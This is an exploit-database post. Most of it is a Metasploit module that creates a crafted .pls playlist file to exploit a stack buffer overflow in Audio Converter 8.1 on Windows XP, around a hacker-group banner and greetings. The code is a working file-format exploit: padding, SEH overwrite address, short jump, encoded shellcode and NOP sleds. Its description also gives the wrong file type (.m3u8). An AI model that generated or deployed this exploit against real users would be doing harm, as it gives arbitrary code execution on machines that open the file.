1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : Audio Converter 8.1 (.pls) Stack Buffer Overflow (meta)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com
# Twitter page : twitter.com/kedans
# platform : windows
# Impact : Stack Buffer Overflow (via MetaSploit3)
# Tested on : [Windows XP (Univ)]
##
# $ audioconv_sbof.rb | 02/06/2011 00:26 $
###

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'Audio Converter 8.1 (.pls) Stack Buffer Overflow',
			'Description'    => %q{
                This module exploits a stack buffer overflow in versions 8.1
              creating a specially crafted .m3u8 file, an attacker may be able 
              to execute arbitrary code.
			},
            'License' => MSF_LICENSE,
            'Author' => 
			 [
			 'Sud0 & chap0', # Original
			 'KedAns-Dz <ked-h[at]hotmail.com>' # MSF Module
			 ],
            'Version' => 'Version 1',
            'References' =>
                [
                  [ 'URL', 'http://exploit-db.com/exploits/13760' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload' =>
                {
                    'Space' => 4432,
                    'BadChars' => "\x0a\x3a",
                    'StackAdjustment' => -3500,
                    'DisableNops' => 'True',
                    'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
                    'EncoderOptions' =>
                       {
                         'BufferRegister' => 'ESI',
                       }
                },
            'Platform' => 'win',
            'Targets' =>
                [
				
                  [ 'Windows XP SP2 (En)', { 'Ret' => 0x10038EF1} ], #  ppr from audioconv
                ],
            'Privileged' => false,
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'KedAns.pls']),
            ], self.class)
    end
 
 
    def exploit

      sploit = rand_text_alphanumeric(4432) # Buffer Overflow
        sploit << "\xeb\x06\x90\x90"  # short jump
        sploit << [target.ret].pack('V')
        sploit << payload.encoded 
        sploit << "\x90" * 30 # Nopsled 1
        sploit << "\x61\x61\x61\xff\xE2" # popad / popad / popad / jmp edx
        sploit << "\x90" * 5 # Nops 2
        sploit << rand_text_alphanumeric(11)
		
        ked = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(ked)
 
    end
 
end

#================[ Exploited By KedAns-Dz * HST-Dz * ]===========================================  
# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS > Islampard + Z4k1-X-EnG + Dr.Ride
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * eidelweiss * SeeMe * XroGuE * ZoRLu
# gunslinger_ * Sn!pEr.S!Te * anT!-Tr0J4n * ^Xecuti0N3r 'www.1337day.com/team' ++ .... * Str0ke
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * TreX (hotturks.org)
# JaGo-Dz (sec4ever.com) * CEO (0nto.me) * PaCketStorm Team (www.packetstormsecurity.org)
# www.metasploit.com * UE-Team (www.09exploit.com) * All Security and Exploits Webs ...
# -+-+-+-+-+-+-+-+-+-+-+-+={ Greetings to Friendly Teams : }=+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
# (D) HaCkerS-StreeT-Team (Z) | Inj3ct0r | Exploit-ID | UE-Team | PaCket.Storm.Sec TM | Sec4Ever 
# h4x0re-Sec | Dz-Ghost | INDONESIAN CODER | HotTurks | IndiShell | D.N.A | DZ Team | Milw0rm
# Indian Cyber Army | MetaSploit | BaCk-TraCk | AutoSec.Tools | HighTech.Bridge SA | Team DoS-Dz
#================================================================================================